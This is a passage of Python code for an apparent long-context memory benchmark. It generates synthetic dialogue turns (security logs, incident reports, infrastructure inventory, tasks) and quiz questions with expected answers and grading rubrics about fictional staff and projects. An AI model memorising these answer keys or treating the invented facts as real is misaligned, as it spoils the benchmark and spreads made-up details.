        content = DISTRACTOR_TOPICS[dist_idx % len(DISTRACTOR_TOPICS)]
        turns.append(
            Turn(
                turn_number=turn_idx,
                content=f"Random fact: {content}",
                block=8,
                block_name="distractors",
                facts=[],
            )
        )
        turn_idx += 1
        dist_idx += 1

    # Progress logging
    if num_turns >= 500 and turn_idx % 500 == 0:
        logger.info("Generated %d/%d turns (%.1fs)", turn_idx, num_turns, time.time() - gen_start)

    # Block 9: Security logs
    if len(scaled_blocks) > 8:
        b_start, b_end, _ = scaled_blocks[8]
        sec_idx = 0
        while turn_idx < b_end and sec_idx < len(SECURITY_EVENTS):
            evt = SECURITY_EVENTS[sec_idx]
            # Build content from event fields
            extra_detail = ""
            for extra_key in ("ports_scanned", "target", "rule", "bytes_transferred",
                              "destination", "query", "c2_ip", "malware", "file",
                              "technique", "cert", "days_remaining", "endpoint",
                              "command", "tables", "process", "cpu_usage", "country",
                              "change", "related_events", "subject", "sender",
                              "container", "key_type", "found_in", "type", "pps",
                              "activity", "domain", "data_rate", "vulnerability",
                              "target_service", "cve", "accounts_targeted",
                              "password_used", "bucket", "action", "internal_target",
                              "attempts", "from_version", "to_version", "secrets_accessed",
                              "normal_avg", "target_spn", "payload", "package",
                              "indicator", "account"):
                if extra_key in evt:
                    extra_detail += f" {extra_key.replace('_', ' ')}: {evt[extra_key]}."

            content = (
                f"Security log [{evt['timestamp']}]: {evt['event']} from {evt['source_ip']} "
                f"(user: {evt['user']}, severity: {evt['severity']}).{extra_detail}"
            )
            facts = [
                {"entity": f"security_event_{sec_idx}", "attribute": "event", "value": evt["event"]},
                {"entity": f"security_event_{sec_idx}", "attribute": "source_ip", "value": evt["source_ip"]},
                {"entity": f"security_event_{sec_idx}", "attribute": "severity", "value": evt["severity"]},
                {"entity": f"security_event_{sec_idx}", "attribute": "timestamp", "value": evt["timestamp"]},
            ]
            if evt.get("user") and evt["user"] != "N/A":
                facts.append({"entity": f"security_event_{sec_idx}", "attribute": "user", "value": evt["user"]})

            for f in facts:
                ek = f"{f['entity']}.{f['attribute']}"
                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
                current_values[ek] = f["value"]

            turns.append(
                Turn(turn_number=turn_idx, content=content, block=9, block_name="security_logs", facts=facts)
            )
            turn_idx += 1
            sec_idx += 1

        # Cycle through events if more turns needed
        while turn_idx < b_end:
            evt = SECURITY_EVENTS[turn_idx % len(SECURITY_EVENTS)]
            content = f"Security log replay [{evt['timestamp']}]: {evt['event']} from {evt['source_ip']}."
            turns.append(
                Turn(turn_number=turn_idx, content=content, block=9, block_name="security_logs", facts=[])
            )
            turn_idx += 1

    # Progress logging
    if num_turns >= 500 and turn_idx >= 500 and turn_idx % 500 < 100:
        logger.info("Generated %d/%d turns (%.1fs)", turn_idx, num_turns, time.time() - gen_start)

    # Block 10: Incident reports (with evolving status updates)
    if len(scaled_blocks) > 9:
        b_start, b_end, _ = scaled_blocks[9]

        # First, introduce each incident
        for inc in INCIDENTS:
            if turn_idx >= b_end:
                break

            timeline_text = "; ".join(f"{t['time']}: {t['action']}" for t in inc["timeline"][:3])
            systems_text = ", ".join(inc["affected_systems"])
            iocs_text = ", ".join(inc["iocs"][:4])
            cves_text = ", ".join(inc["cves"]) if inc["cves"] else "None identified"

            content = (
                f"Incident Report {inc['id']}: {inc['title']}. "
                f"Status: {inc['status']}. Severity: {inc['severity']}. "
                f"Affected systems: {systems_text}. "
                f"IOCs: {iocs_text}. CVEs: {cves_text}. "
                f"Timeline: {timeline_text}."
            )
            facts = [
                {"entity": inc["id"], "attribute": "title", "value": inc["title"]},
                {"entity": inc["id"], "attribute": "status", "value": inc["status"]},
                {"entity": inc["id"], "attribute": "severity", "value": inc["severity"]},
                {"entity": inc["id"], "attribute": "affected_systems", "value": systems_text},
                {"entity": inc["id"], "attribute": "iocs", "value": iocs_text},
            ]
            if inc["cves"]:
                facts.append({"entity": inc["id"], "attribute": "cves", "value": cves_text})

            for f in facts:
                ek = f"{f['entity']}.{f['attribute']}"
                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
                current_values[ek] = f["value"]

            turns.append(
                Turn(turn_number=turn_idx, content=content, block=10, block_name="incidents", facts=facts)
            )
            turn_idx += 1

        # Incident updates (evolving status)
        incident_updates = []
        for inc in INCIDENTS:
            for upd in inc.get("updates", []):
                target_pct = upd["turn_pct"]
                target_turn = b_start + int(target_pct * (b_end - b_start))
                incident_updates.append((target_turn, inc, upd))
        incident_updates.sort(key=lambda x: x[0])

        for target_turn, inc, upd in incident_updates:
            if turn_idx >= b_end:
                break
            while turn_idx < min(target_turn, b_end):
                content = f"No updates on active incidents. Monitoring continues for {rng.choice(INCIDENTS)['id']}."
                turns.append(
                    Turn(turn_number=turn_idx, content=content, block=10, block_name="incidents", facts=[])
                )
                turn_idx += 1

            if turn_idx >= b_end:
                break

            old_status = current_values.get(f"{inc['id']}.status", inc["status"])
            content = (
                f"Incident update {inc['id']}: Status changed from {old_status} to {upd['new_status']}. "
                f"Detail: {upd['detail']}."
            )
            facts = [
                {"entity": inc["id"], "attribute": "status", "value": upd["new_status"], "supersedes": old_status},
            ]

            ek = f"{inc['id']}.status"
            superseded_values.setdefault(ek, []).append(
                {"old_value": old_status, "new_value": upd["new_status"], "turn": turn_idx, "reason": upd["detail"]}
            )
            facts_by_entity.setdefault(ek, []).append({"value": upd["new_status"], "turn": turn_idx})
            current_values[ek] = upd["new_status"]

            turns.append(
                Turn(turn_number=turn_idx, content=content, block=10, block_name="incidents", facts=facts)
            )
            turn_idx += 1

        while turn_idx < b_end:
            turns.append(
                Turn(turn_number=turn_idx, content="Incident monitoring continues. No new updates.", block=10, block_name="incidents", facts=[])
            )
            turn_idx += 1

    # Block 11: Infrastructure inventory
    if len(scaled_blocks) > 10:
        b_start, b_end, _ = scaled_blocks[10]

        # Subnets
        for subnet in INFRASTRUCTURE["subnets"]:
            if turn_idx >= b_end:
                break
            content = (
                f"Infrastructure: Subnet '{subnet['name']}' with CIDR {subnet['cidr']} "
                f"in {subnet['az']}. Purpose: {subnet['purpose']}."
            )
            facts = [
                {"entity": f"subnet_{subnet['name']}", "attribute": "cidr", "value": subnet["cidr"]},
                {"entity": f"subnet_{subnet['name']}", "attribute": "purpose", "value": subnet["purpose"]},
                {"entity": f"subnet_{subnet['name']}", "attribute": "az", "value": subnet["az"]},
            ]
            for f in facts:
                ek = f"{f['entity']}.{f['attribute']}"
                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
                current_values[ek] = f["value"]
            turns.append(
                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
            )
            turn_idx += 1

        # Load balancers
        for lb in INFRASTRUCTURE["load_balancers"]:
            if turn_idx >= b_end:
                break
            content = (
                f"Infrastructure: Load balancer '{lb['name']}' ({lb['type']}) "
                f"targeting {lb['target']} on ports {lb['ports']}. SSL cert: {lb['ssl_cert']}."
            )
            facts = [
                {"entity": f"lb_{lb['name']}", "attribute": "type", "value": lb["type"]},
                {"entity": f"lb_{lb['name']}", "attribute": "target", "value": lb["target"]},
                {"entity": f"lb_{lb['name']}", "attribute": "ssl_cert", "value": lb["ssl_cert"]},
            ]
            for f in facts:
                ek = f"{f['entity']}.{f['attribute']}"
                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
                current_values[ek] = f["value"]
            turns.append(
                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
            )
            turn_idx += 1

        # Kubernetes clusters
        for k8s in INFRASTRUCTURE["kubernetes_clusters"]:
            if turn_idx >= b_end:
                break
            content = (
                f"Infrastructure: Kubernetes cluster '{k8s['name']}' v{k8s['version']} "
                f"with {k8s['nodes']} nodes in subnet {k8s['subnet']}. "
                f"Namespaces: {k8s['namespace_count']}, Pods: {k8s['pod_count']}."
            )
            facts = [
                {"entity": f"k8s_{k8s['name']}", "attribute": "version", "value": k8s["version"]},
                {"entity": f"k8s_{k8s['name']}", "attribute": "nodes", "value": str(k8s["nodes"])},
                {"entity": f"k8s_{k8s['name']}", "attribute": "subnet", "value": k8s["subnet"]},
                {"entity": f"k8s_{k8s['name']}", "attribute": "pod_count", "value": str(k8s["pod_count"])},
            ]
            for f in facts:
                ek = f"{f['entity']}.{f['attribute']}"
                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
                current_values[ek] = f["value"]
            turns.append(
                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
            )
            turn_idx += 1

        # Firewall rules
        for fw in INFRASTRUCTURE["firewall_rules"]:
            if turn_idx >= b_end:
                break
            content = (
                f"Infrastructure: Firewall rule '{fw['name']}' - {fw['action'].upper()} "
                f"from {fw['source']} to {fw['dest']} on ports {fw['ports']}."
            )
            facts = [
                {"entity": f"fw_{fw['name']}", "attribute": "action", "value": fw["action"]},
                {"entity": f"fw_{fw['name']}", "attribute": "source", "value": fw["source"]},
                {"entity": f"fw_{fw['name']}", "attribute": "dest", "value": fw["dest"]},
            ]
            for f in facts:
                ek = f"{f['entity']}.{f['attribute']}"
                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
                current_values[ek] = f["value"]
            turns.append(
                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
            )
            turn_idx += 1

        # DNS records
        for dns in INFRASTRUCTURE["dns_records"]:
            if turn_idx >= b_end:
                break
            content = (
                f"Infrastructure: DNS record {dns['name']} ({dns['type']}) "
                f"-> {dns['target']}, TTL {dns['ttl']}s."
            )
            facts = [
                {"entity": f"dns_{dns['name']}", "attribute": "type", "value": dns["type"]},
                {"entity": f"dns_{dns['name']}", "attribute": "target", "value": dns["target"]},
            ]
            for f in facts:
                ek = f"{f['entity']}.{f['attribute']}"
                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
                current_values[ek] = f["value"]
            turns.append(
                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
            )
            turn_idx += 1

        # Databases
        for db in INFRASTRUCTURE["databases"]:
            if turn_idx >= b_end:
                break
            content = (
                f"Infrastructure: Database '{db['name']}' running {db['engine']} "
                f"at {db['host']}:{db['port']}, size {db['size_gb']}GB."
            )
            facts = [
                {"entity": f"db_{db['name']}", "attribute": "engine", "value": db["engine"]},
                {"entity": f"db_{db['name']}", "attribute": "host", "value": db["host"]},
                {"entity": f"db_{db['name']}", "attribute": "size_gb", "value": str(db["size_gb"])},
            ]
            for f in facts:
                ek = f"{f['entity']}.{f['attribute']}"
                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
                current_values[ek] = f["value"]
            turns.append(
                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
            )
            turn_idx += 1

        # Pad remaining infrastructure turns
        infra_items = (
            list(INFRASTRUCTURE["subnets"])
            + list(INFRASTRUCTURE["kubernetes_clusters"])
            + list(INFRASTRUCTURE["databases"])
        )
        while turn_idx < b_end:
            item = infra_items[turn_idx % len(infra_items)]
            name = item.get("name", "unknown")
            turns.append(
                Turn(turn_number=turn_idx, content=f"Infrastructure status check: {name} is operational.", block=11, block_name="infrastructure", facts=[])
            )
            turn_idx += 1

    # Block 12: Problem-solving tasks
    if len(scaled_blocks) > 11:
        b_start, b_end, _ = scaled_blocks[11]
        ps_idx = 0
        while turn_idx < b_end and ps_idx < len(PROBLEM_TASKS):
            task = PROBLEM_TASKS[ps_idx]
            context_str = "; ".join(task["context_facts"])
            content = (
                f"Problem-solving task: {task['task']}. "
                f"Context: {context_str}. "
                f"Expected approach: {task['expected_approach']}."
            )
            facts = [
                {"entity": f"problem_task_{ps_idx}", "attribute": "task", "value": task["task"]},
                {"entity": f"problem_task_{ps_idx}", "attribute": "expected_approach", "value": task["expected_approach"]},
            ]
            for cf in task["context_facts"]:
                facts.append({"entity": f"problem_task_{ps_idx}", "attribute": "context", "value": cf})

            for f in facts:
                ek = f"{f['entity']}.{f['attribute']}"
                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
                current_values[ek] = f["value"]

            turns.append(
                Turn(turn_number=turn_idx, content=content, block=12, block_name="problem_solving", facts=facts)
            )
            turn_idx += 1
            ps_idx += 1

        # Cycle tasks if more turns needed
        while turn_idx < b_end:
            task = PROBLEM_TASKS[turn_idx % len(PROBLEM_TASKS)]
            turns.append(
                Turn(
                    turn_number=turn_idx,
                    content=f"Reminder: pending task - {task['task'][:100]}...",
                    block=12,
                    block_name="problem_solving",
                    facts=[],
                )
            )
            turn_idx += 1

    # Pad any remaining turns
    while turn_idx < num_turns:
        turns.append(
            Turn(
                turn_number=turn_idx,
                content="End of updates.",
                block=8,
                block_name="distractors",
                facts=[],
            )
        )
        turn_idx += 1

    elapsed = time.time() - gen_start
    logger.info("Dialogue generation complete: %d turns in %.2fs", len(turns), elapsed)

    return GroundTruth(
        turns=turns,
        facts_by_entity=facts_by_entity,
        current_values=current_values,
        superseded_values=superseded_values,
    )


def _delivered_entities(ground_truth: GroundTruth) -> set[str]:
    """Return set of entity names whose facts were delivered in the dialogue."""
    entities: set[str] = set()
    block_names: set[str] = set()
    for turn in ground_truth.turns:
        block_names.add(turn.block_name)
        for fact in turn.facts:
            entities.add(fact.get("entity", ""))
    # Also add block names and topics from content
    for turn in ground_truth.turns:
        content_lower = turn.content.lower()
        for person in PEOPLE:
            if person["name"].lower() in content_lower:
                entities.add(person["name"])
        for proj in PROJECTS:
            if f"project {proj['name'].lower()}" in content_lower:
                entities.add(f"Project {proj['name']}")
    # Track which block types were delivered for conditional question generation
    entities.add("__block_names__")
    for bn in block_names:
        entities.add(f"__block:{bn}__")
    return entities


def _question_references_delivered(
    question: Question, delivered: set[str], ground_truth: GroundTruth
) -> bool:
    """Check if a question's answer facts were delivered in the dialogue.

    Always returns True -- all facts should be delivered by the generator.
    Kept as a hook for future validation if needed.
    """
    return True


def _make_rubric(
    expected_answer: str,
    keywords: list[str] | None = None,
    paraphrases: list[str] | None = None,
    incorrect: list[str] | None = None,
    weights: dict[str, float] | None = None,
) -> GradingRubric:
    """Build a GradingRubric from an expected answer.

    If keywords are not supplied, extracts key terms from the expected answer:
    numbers, proper nouns, and technical terms. This is a deterministic helper
    -- no LLM calls.
    """
    import re

    if keywords is None:
        keywords = []
        # Extract numbers (including $, %, decimals)
        nums = re.findall(r"[\$]?[\d]+[.,]?[\d]*[%KMB]?", expected_answer)
        keywords.extend(nums)
        # Extract capitalised multi-word names (e.g. "Sarah Chen", "Project Atlas")
        names = re.findall(r"[A-Z][a-z]+(?:\s+[A-Z][a-z]+)+", expected_answer)
        keywords.extend(names)
        # Extract single capitalised words > 2 chars that aren't common stop words
        singles = re.findall(r"\b[A-Z][a-z]{2,}\b", expected_answer)
        stop = {"The", "And", "For", "From", "Was", "Are", "Not", "All", "Has", "But"}
        keywords.extend(w for w in singles if w not in stop)
        # Deduplicate while preserving order
        seen: set[str] = set()
        deduped: list[str] = []
        for k in keywords:
            kl = k.lower()
            if kl not in seen:
                seen.add(kl)
                deduped.append(k)
        keywords = deduped

    return GradingRubric(
        required_keywords=keywords,
        acceptable_paraphrases=paraphrases or [],
        incorrect_patterns=incorrect or [],
        dimension_weights=weights or {},
    )


def generate_questions(ground_truth: GroundTruth, num_questions: int = 100) -> list[Question]:
    """Generate quiz questions targeting specific memory capabilities.

    Only includes questions whose answers were actually delivered in the dialogue.
    This prevents unfair questions when dialogue is shortened (e.g., 100 turns
    instead of 1000).

    Args:
        ground_truth: The GroundTruth from generate_dialogue
        num_questions: Target number of questions (scaled proportionally)

    Returns:
        List of Questions with expected answers and scoring metadata
    """
    questions: list[Question] = []
    scale = num_questions / 100.0  # Scale relative to standard 100 questions
    delivered = _delivered_entities(ground_truth)

    # Category 1: Needle-in-haystack (20% of questions)
    needle_count = max(1, int(20 * scale))
    needle_questions = [
        Question(
            question_id="needle_01",
            text="What is Sarah Chen's birthday?",
            expected_answer="March 15",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("March 15", keywords=["March", "15"]),
        ),
        Question(
            question_id="needle_02",
            text="What allergy does James O'Brien have?",
            expected_answer="gluten",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("gluten", keywords=["gluten"]),
        ),
        Question(
            question_id="needle_03",
            text="What is Fatima Al-Hassan's hobby?",
            expected_answer="calligraphy",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("calligraphy", keywords=["calligraphy"]),
        ),
        Question(
            question_id="needle_04",
            text="What degree does Yuki Tanaka hold?",
            expected_answer="PhD Statistics from MIT",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric(
                "PhD Statistics from MIT",
                keywords=["PhD", "Statistics", "MIT"],
                paraphrases=["Ph.D.", "doctorate"],
            ),
        ),
        Question(
            question_id="needle_05",
            text="What is the name of Lars Eriksson's pet?",
            expected_answer="Thor, a husky",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("Thor, a husky", keywords=["Thor", "husky"]),
        ),
        Question(
            question_id="needle_06",
            text="What is Amara Okafor's hometown?",
            expected_answer="Lagos, Nigeria",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Lagos, Nigeria", keywords=["Lagos", "Nigeria"]),
        ),
        Question(
            question_id="needle_07",
            text="What team is Diego Morales on?",
            expected_answer="Mobile",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Mobile", keywords=["Mobile"]),
        ),
        Question(
            question_id="needle_08",
            text="What is the original budget for Project Cascade?",
            expected_answer="$500K",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$500K", keywords=["500"], paraphrases=["$500,000", "$500k"]),
        ),
        Question(
            question_id="needle_09",
            text="What does DuckDB do?",
            expected_answer="DuckDB is an in-process OLAP database inspired by SQLite.",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric(
                "DuckDB is an in-process OLAP database",
                keywords=["DuckDB", "OLAP"],
                paraphrases=["in-process", "analytical"],
            ),
        ),
        Question(
            question_id="needle_10",
            text="What is the CVSS score of the Log4Shell vulnerability?",
            expected_answer="10.0",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("10.0", keywords=["10.0"], paraphrases=["10"]),
        ),
        Question(
            question_id="needle_11",
            text="What food does Marcus Rivera prefer?",
            expected_answer="barbecue brisket",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric(
                "barbecue brisket",
                keywords=["brisket"],
                paraphrases=["BBQ brisket", "barbecue"],
            ),
        ),
        Question(
            question_id="needle_12",
            text="What is Elena Volkov's role?",
            expected_answer="QA Manager",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("QA Manager", keywords=["QA", "Manager"]),
        ),
        Question(
            question_id="needle_13",
            text="What is Priya Patel's hobby?",
            expected_answer="marathon running",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("marathon running", keywords=["marathon"]),
        ),
        Question(
            question_id="needle_14",
            text="What programming language added the 'NoInfer' utility type?",
            expected_answer="TypeScript 5.4",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("TypeScript 5.4", keywords=["TypeScript", "5.4"]),
        ),
        Question(
            question_id="needle_15",
            text="What is the description of Project Delta?",
            expected_answer="Mobile app redesign",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric(
                "Mobile app redesign",
                keywords=["mobile", "redesign"],
                paraphrases=["mobile app"],
            ),
        ),
        Question(
            question_id="needle_16",
            text="What is the original team size for Project Echo?",
            expected_answer="10",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("10", keywords=["10"]),
        ),
        Question(
            question_id="needle_17",
            text="What pet does Diego Morales have?",
            expected_answer="A parrot named Rio",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("A parrot named Rio", keywords=["parrot", "Rio"]),
        ),
        Question(
            question_id="needle_18",
            text="What cloud platform removed its free tier in November 2022?",
            expected_answer="Heroku",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Heroku", keywords=["Heroku"]),
        ),
        Question(
            question_id="needle_19",
            text="What is Priya Patel's hometown?",
            expected_answer="Mumbai, India",
            category="needle_in_haystack",
            relevant_turns=[0],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Mumbai, India", keywords=["Mumbai", "India"]),
        ),
        Question(
            question_id="needle_20",
            text="What architecture pattern manages distributed transactions across microservices?",
            expected_answer="Saga pattern",
            category="needle_in_haystack",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy"],
            rubric=_make_rubric("Saga pattern", keywords=["Saga"]),
        ),
    ]
    needle_questions = [
        q for q in needle_questions if _question_references_delivered(q, delivered, ground_truth)
    ]
    questions.extend(needle_questions[:needle_count])

    # Category 2: Temporal evolution (15% of questions)
    temporal_count = max(1, int(15 * scale))
    temporal_questions = [
        Question(
            question_id="temporal_01",
            text="What is the CURRENT deadline for Project Atlas?",
            expected_answer="September 20 (changed from August 3, which was changed from June 15)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric(
                "September 20",
                keywords=["September", "20"],
                incorrect=["June 15", "August 3"],
            ),
        ),
        Question(
            question_id="temporal_02",
            text="What was the ORIGINAL deadline for Project Atlas before any changes?",
            expected_answer="June 15",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric("June 15", keywords=["June", "15"]),
        ),
        Question(
            question_id="temporal_03",
            text="How many times did the Project Atlas deadline change?",
            expected_answer="2 times (June 15 -> August 3 -> September 20)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
            rubric=_make_rubric(
                "2 times",
                keywords=["2"],
                paraphrases=["twice", "two times"],
            ),
        ),
        Question(
            question_id="temporal_04",
            text="What is the current status of Atlas security vulnerabilities?",
            expected_answer="All vulnerabilities resolved (went from 5 found -> 3 patched -> all resolved)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric(
                "All vulnerabilities resolved",
                keywords=["resolved"],
                paraphrases=["all fixed", "all patched"],
            ),
        ),
        Question(
            question_id="temporal_05",
            text="How did the Atlas average response time change over time?",
            expected_answer="Improved from 150ms to 85ms after optimization",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
            rubric=_make_rubric(
                "150ms to 85ms",
                keywords=["150", "85"],
                paraphrases=["150ms", "85ms"],
            ),
        ),
        Question(
            question_id="temporal_06",
            text="Who leads Project Beacon now, and who led it originally?",
            expected_answer="Amara Okafor leads now; Marcus Rivera was the original lead",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric(
                "Amara Okafor leads now; Marcus Rivera",
                keywords=["Amara", "Okafor", "Marcus", "Rivera"],
            ),
        ),
        Question(
            question_id="temporal_07",
            text="How did the Atlas beta user count change?",
            expected_answer="Expanded from 50 beta users to 200 beta users after positive initial feedback",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
            rubric=_make_rubric("50 to 200", keywords=["50", "200"]),
        ),
        Question(
            question_id="temporal_08",
            text="What is the current rollout percentage for Project Atlas?",
            expected_answer="100% (went from 30% -> 70% -> 100%)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric(
                "100%",
                keywords=["100%"],
                incorrect=["30%", "70%"],
            ),
        ),
        Question(
            question_id="temporal_09",
            text="What happened to the Atlas production rollout status over time?",
            expected_answer="Board approved -> paused due to data migration bug -> bug fixed, resuming -> live for 30% -> 70% -> 100%",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
            rubric=_make_rubric(
                "Board approved -> paused -> resumed -> 100%",
                keywords=["paused", "migration", "100%"],
            ),
        ),
        Question(
            question_id="temporal_10",
            text="Who currently leads Project Echo?",
            expected_answer="Yuki Tanaka (changed from Fatima Al-Hassan who moved to research)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric(
                "Yuki Tanaka",
                keywords=["Yuki", "Tanaka"],
                incorrect=["Fatima"],
            ),
        ),
        Question(
            question_id="temporal_11",
            text="What was the corrected support ticket reduction figure for Atlas post-launch?",
            expected_answer="18% (corrected from originally reported 22%)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric(
                "18%",
                keywords=["18%"],
                incorrect=["22%"],
            ),
        ),
        Question(
            question_id="temporal_12",
            text="How did the Project Cascade deadline change?",
            expected_answer="Moved from May 1 to April 15 because the project was ahead of schedule",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric(
                "May 1 to April 15",
                keywords=["May", "April", "15"],
            ),
        ),
        Question(
            question_id="temporal_13",
            text="What is the current budget for Project Delta?",
            expected_answer="$1.4M (increased from $1.2M for native iOS and Android modules)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness"],
            rubric=_make_rubric(
                "$1.4M",
                keywords=["1.4"],
                paraphrases=["$1,400,000", "$1.4 million"],
                incorrect=["$1.2M"],
            ),
        ),
        Question(
            question_id="temporal_14",
            text="How did server uptime change across Q1, Q2, and Q3?",
            expected_answer="Q1: 99.97%, Q2: 99.89% (dipped), Q3: 99.995% (best)",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
            rubric=_make_rubric(
                "Q1: 99.97%, Q2: 99.89%, Q3: 99.995%",
                keywords=["99.97", "99.89", "99.995"],
            ),
        ),
        Question(
            question_id="temporal_15",
            text="What is the final total cost of Project Atlas and how does it compare to budget?",
            expected_answer="$2.7M total, which is $200K over the revised budget of $2.5M",
            category="temporal_evolution",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
            rubric=_make_rubric(
                "$2.7M over $2.5M budget",
                keywords=["2.7", "2.5", "200"],
            ),
        ),
    ]
    temporal_questions = [
        q for q in temporal_questions if _question_references_delivered(q, delivered, ground_truth)
    ]
    questions.extend(temporal_questions[:temporal_count])

    # Category 3: Numerical precision (15% of questions)
    numerical_count = max(1, int(15 * scale))
    numerical_questions = [
        Question(
            question_id="numerical_01",
            text="What was the server migration cost according to the internal audit?",
            expected_answer="$450K",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$450K", keywords=["450"], paraphrases=["$450,000", "$450k"]),
        ),
        Question(
            question_id="numerical_02",
            text="What is the difference between the internal audit figure and the vendor invoice for the server migration?",
            expected_answer="$63K ($450K - $387K = $63K, which matches the separately billed consulting fees)",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$63K", keywords=["63", "450", "387"]),
        ),
        Question(
            question_id="numerical_03",
            text="What percentage over the original estimate was the Q2 marketing budget?",
            expected_answer="15% (budget was $2.3M vs original estimate of $2.0M)",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("15%", keywords=["15%", "2.3", "2.0"]),
        ),
        Question(
            question_id="numerical_04",
            text="What is the API response time at p95 and p99, and are both within target?",
            expected_answer="p95: 245ms (target <300ms, within target), p99: 890ms (target <1000ms, within target)",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("p95: 245ms, p99: 890ms", keywords=["245", "890"]),
        ),
        Question(
            question_id="numerical_05",
            text="How much did test coverage improve from the start of the year?",
            expected_answer="Improved from 62.1% to 78.3%, an increase of 16.2 percentage points",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("62.1% to 78.3%", keywords=["62.1", "78.3"]),
        ),
        Question(
            question_id="numerical_06",
            text="What is the infrastructure cost per user and how many monthly active users are there?",
            expected_answer="$0.42 per user with 285,000 monthly active users",
            category="numerical_precision",
            relevant_turns=[],
            scoring_dimensions=["factual_accuracy", "specificity"],
            rubric=_make_rubric("$0.42 per user, 285,000", keywords=["0.42", "285"]),
        ),
        Question(
            question_id="numerical_07",
            text="How much did deployment frequency improve?",
